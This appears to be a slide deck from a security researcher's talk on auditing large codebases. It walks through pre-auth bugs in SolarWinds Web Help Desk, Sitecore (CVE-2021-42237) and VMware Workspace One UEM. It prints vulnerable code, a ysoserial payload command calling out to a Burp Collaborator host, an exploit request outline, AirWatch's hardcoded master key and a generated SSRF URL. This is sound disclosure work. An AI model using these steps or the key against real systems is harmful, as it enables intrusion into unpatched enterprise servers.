• Around ~2k instances exposed to the external internet.
Remove the stigma from huge codebases
• SolarWinds have a help desk product that is used by large enterprises. 
• The code base is huge. There is Spring, WebObjects, traditional servlets and 
more. 
• Initially this can be really daunting to take a look at due to the scope, however 
with some intelligent analysis of sources and sinks, it starts to get easier. 
• My number one advice when it comes to auditing complex software is trying 
to map out as much attack surface in the form of sources and sinks as 
possible. Then do your auditing after you understand this.
Development Hardcoded Credentials
Production Hardcoded Credentials
What does this let us access?
• These credentials let us access a big part of the Spring web app embedded 
in this software. 
• The most interesting controller for this was found at /helpdesk/WEB-INF/lib/
com/solarwinds/whd/report/asset/AssetReportController.java 
• Surprisingly, Solarwinds were exposing endpoints that let you run arbitrary 
Hibernate queries. 
• Hibernate talks directly to the database based off models explicitly defined in 
Java.
Hibernate Query Routes
Hibernate Query Routes
Putting it all together
Putting it all together
What’s not shown in this presentation
• The hours spent mapping out sources and sinks. 
• Understanding the authentication flow for some Spring routes and how our 
hardcoded credentials enable this vulnerability. 
• Numerous failed attempts at exploiting certain vulnerability classes in other 
areas of the code base. 
• The vast amount of code in this codebase causing auditing fatigue. 
• Shouting “F*** YEAH” after discovering this pre-auth critical bug.
Impact
• An unauthenticated user can run arbitrary SQL against Solarwinds Web Help 
Desk’s internal database. 
• This allows attackers to obtain the username and password hash from the 
database. 
• This also allows attackers to insert arbitrary data into the database. 
• An alternate vector to gaining entry could be replacing the password hash 
with one you have generated yourself, or adding a new user. 
• Limited to Hibernate SQL queries.
Exploit Writeup
https://bit.ly/3va9ApJ 
Hacking Sitecore Experience 
Platform (CVE-2021-42237)
What is Sitecore’s Experience Platform?
• Sitecore’s experience platform is a comprehensive CMS used by large 
enterprises, government, banks and fortune 500 companies. 
• You can build a lot of “digital experiences” through Sitecore’s experience 
platform. 
• There’s around ~10k instances of this software running on the internet, 
exposed externally. 
• A handful of bug bounty programs were affected by discovering bugs in this 
software.
A note on giving up
• Throughout my source code auditing journey of Sitecore’s experience 
platform, I almost gave up like five times. 
• It was so tempting to walk away and not spend more time auditing this 
software. 
• You have to be really motivated to find software vulnerabilities through source 
code auditing, when the code base is very large and sometimes complex. 
• My best advice is taking a lot of breaks. Every time you feel fatigued, take 
another break and come back to the source code when you are feeling better.
Grabbing Sitecore Source Code
• Initially, I obtained Sitecore’s source code by searching for Github repo’s 
where people had posted their Sitecore web root to a Github repo. 
• I looked for Github repos that were recent and was able to successfully 
obtain a copy of Sitecore source code this way (DLLs and IIS web root). 
• I decompiled these DLLs and opened up a  
code editor with two folders opened,  
the web root and the decompiled source code. 
• This was pivotal to being able to map out the attack surface from items 
exposed in the web root, back to the C# source code.
Mapping out the attack surface
• Sitecore has a complex attack surface. A lot of the attack surface is defined 
in .config files located in App_Config. 
• However, Sitecore also exposes a number of aspx / ashx files in the web root 
• Inside the web.config file, we find the following line:
Mapping out the attack surface
• As we know that the sitecore/shell directory in the deployment is 
exposed via IIS (web.config), we can start auditing the files 
within this directory. 
• The journey in mapping out the attack surface is not over yet, we 
still are not sure about what is pre-authentication vs. what is 
post-authentication. This becomes clearer as we iterate through 
each aspx/ashx file and read the source code to see whether or 
not there are authentication requirements.
Discovering the vulnerable endpoint
• When we investigated some of the files inside the sitecore/shell directory, we 
came across /sitecore/shell/ClientBin/Reporting/Report.ashx which had the 
following contents: 
• Since we’ve loaded up the source code in our IDE, we simply check out the 
source code of Sitecore.sitecore.shell.ClientBin.Reporting.Report located at 
Sitecore.Xdb.Client/Sitecore/sitecore/shell/ClientBin/Reporting/Report.cs.
Report.cs
public void ProcessRequest(HttpContext context)
{
Assert.ArgumentNotNull(context, "context");
object obj = null;
try
{
obj = ProcessReport(context);
}
catch (Exception ex)
{
Log.Error("Failure running the requested report.", ex, this);
obj = ex;
}
context.Response.ContentType = "application/xml";
ReportDataSerializer.SerializeResponse(context.Response.OutputStream, obj);
}
private DataTable ProcessReport(HttpContext context)
{
string source = null;
ReportDataQuery query = ReportDataSerializer.DeserializeQuery(context.Request.InputStream, out source);
DataTable dataTable = (Factory.CreateObject("reporting/dataProvider", assert: true) as ReportDataProviderBase).GetData(source, query, CachingPolicy.WithCacheDisabled).GetDataTable();
if (string.IsNullOrWhiteSpace(dataTable.TableName))
{
dataTable.TableName = "report";
}
return dataTable;
}
}
}
ReportDataSerializer.cs
private static void DeserializeParameters(XmlReader reader, Dictionary parameters)
{
reader.ReadStartElement("parameters");
bool flag = !reader.EOF;
while (flag)
{
if (reader.NodeType == XmlNodeType.Element && reader.Name == "parameter")
{
reader.MoveToContent();
string attribute = reader.GetAttribute("name");
if (attribute != null)
{
for (bool flag2 = reader.Read(); flag2 && reader.NodeType != XmlNodeType.Element; flag2 = reader.Read())
{
}
object value = new NetDataContractSerializer().ReadObject(reader, verifyObjectName: true);
parameters.Add(attribute, value);
}
}
flag = reader.Read();
}
}
Crafting a payload
    foo
SERIALIZED XML OBJECT HERE
./ysoserial.exe -f NetDataContractSerializer -g TypeConfuseDelegate -c "nslookup 
yuwewp90p365hx64wh7rumz8kzqxem.burpcollaborator.net" -o base64 -t
Final RCE Payload
POST /sitecore/shell/ClientBin/Reporting/Report.ashx HTTP/1.1
Host: sitecore.local
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like 
Gecko) Chrome/92.0.4515.131 Safari/537.36
Connection: close
Content-Type: text/xml
Content-Length: 5919
    foo
SERIALIZED XML PAYLOAD HERE
Exploit Writeup
https://bit.ly/3vGfUo5 
VMWare Workspace One UEM 
(AirWatch)
What is Workspace One UEM?
• Workspace One UEM is used for mobility management (MDM) by enterprises. 
• Mobile device management is the administration of mobile devices, such as 
smartphones, tablet computers and laptops. MDM is usually implemented 
with the use of a third-party product that has management features for 
particular vendors of mobile devices. 
• VMWare acquired AirWatch, and then renamed AirWatch into Workspace One 
UEM. 
• Almost every large enterprise has some sort of MDM solution, and VMWare 
Workspace One UEM is a really popular one.
Mapping out the attack surface
• Installing Workspace One UEM was almost 
harder than discovering the vulnerability lol. 
• These folders inside the websites directory are 
all deployed under different virtual paths i.e. /
Catalog/ and /AirWatch/. 
• Presence of some ASHX files which is what we 
focused on when initially looking at the attack 
surface. 
• Some ASHX files were not protected by auth.
BlobHandler.ashx
• This file existed in multiple virtual paths, however, the ones we found to be 
vulnerable were located in /AirWatch/ and /Catalog/. 
• This endpoint was accessible pre-authentication and no authentication logic 
was found within the code or web.config files.
Logic
• This snippet of code is proxying a request, as long as we provide an 
“encrypted” URL. 
• If an encrypted URL is provided, a HTTP request will be made to this 
encrypted URL (arbitrary method, body, headers) and the full response will 
be proxied back to the user. 
• This functionality was not in use by literally anything else in the code base, a 
big question is why it was implemented in the first place. 
• Essentially a full read SSRF, with full control over the request, if we work out 
this “encryption” algorithm.
Encryption Function
// AirWatch.Security.Cryptography.AirWatchDataEncryptor 
using AirWatch.Security.Cryptography.KeyManagement; 
public string Encrypt(string stringToEncrypt) 
{ 
    MasterKey masterKey = masterKeyResolver.GetMasterKey(); 
    return GetEncryptorForKey(masterKey).Encrypt(stringToEncrypt); 
} 
Getting the Master Key
// AirWatch.Security.Cryptography.KeyManagement.MasterKeyResolver 
using AirWatch.Logging; 
public MasterKey GetMasterKey(string keyVersion) 
{ 
    ILogger current = LogAspect.Current; 
    if (string.IsNullOrEmpty(keyVersion) || keyVersion.Equals("kv0")) 
    { 
        current.Debug("keyVersion is not defined or equals the default key version."); 
        return DefaultMasterKey; 
    } 
    MasterKey masterKeyFromCache = GetMasterKeyFromCache(keyVersion); 
    if (masterKeyFromCache != null) 
    { 
        return masterKeyFromCache; 
    } 
    MasterKey masterKeyFromConfigFile = GetMasterKeyFromConfigFile(); 
    if (masterKeyFromConfigFile != null && keyVersion.Equals(masterKeyFromConfigFile.KeyVersion)) 
    { 
        StoreMasterKeyToCache(masterKeyFromConfigFile); 
        return masterKeyFromConfigFile; 
    } 
    MasterKey masterKeyFromDb = GetMasterKeyFromDb(keyVersion); 
    if (masterKeyFromDb == null || !masterKeyFromDb.IsKeyValid) 
    { 
        return DefaultMasterKey; 
    } 
    StoreMasterKeyToCache(masterKeyFromDb); 
    return masterKeyFromDb; 
} 
Default Master Key
// AirWatch.Security.Cryptography.KeyManagement.MasterKeyResolver 
private static readonly MasterKey DefaultMasterKey = new MasterKey(); 
Hardcoded master key 
// AirWatch.Security.Cryptography.KeyManagement.MasterKey 
using System.Runtime.CompilerServices; 
public MasterKey() 
{ 
    KeyVersion = "kv0"; 
    Passphrase = "5c5e2c554f4f644b54383127495b356d7b36714e4b214a6967492657290123a0"; 
    SaltData = "s@1tValue"; 
    IsKeyValid = true; 
} 
Hooking In
• In order to create the PoC, we hooked into the encryption functions defined 
in the DLL files. 
• By leveraging the already existing functions for encryption, we were able to 
create a CLI application that was capable of “encrypting” arbitrary strings. 
• This allowed us to specify arbitrary URLs to be encrypted, which could then 
be used when requesting BlobHandler.ashx. 
• This successfully led to full-read pre-authentication SSRF.
Final Exploit
• C:\Users\Administrator\Downloads\EncryptAirWatchSSRF>python 
airshock.py --url http://airwatch --ssrf http://example.com --request 
• [*] Generated SSRF payload: 
• http://airwatch/Catalog/BlobHandler.ashx?
Url=YQB3AGUAdgAyADoAawB2ADAAOgB4AGwAawBiAEoAbwB5AGMAV
wB0AFEAMwB6ADMAbABLADoARQBKAGYAYgBHAE4ATgBDADUARQBBA
G0AZQBZAE4AUwBiAFoAVgBZAHYAZwBEAHYAdQBKAFgATQArAFUATQB
kAGcAZAByAGMAMgByAEUAQwByAGIAcgBmAFQAVgB3AD0A
Exploit Writeup
https://bit.ly/3rOH4YO
assetnote.io
@assetnote